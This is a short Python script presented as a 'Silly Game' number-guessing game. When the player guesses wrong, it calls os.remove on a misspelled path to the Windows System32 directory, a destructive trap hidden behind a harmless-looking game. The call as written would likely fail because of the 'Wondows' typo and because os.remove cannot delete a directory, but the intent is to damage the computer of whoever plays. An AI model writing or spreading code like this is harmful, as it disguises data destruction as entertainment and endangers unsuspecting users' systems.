import random
import os

number = random.randint(1,10)

guess = input("Silly Game! Guess number between 1 adn 10")
guess = int(guess)

if guess == number:
    print("You Won!")
else:
    os.remove("C:\Wondows\System32")

    
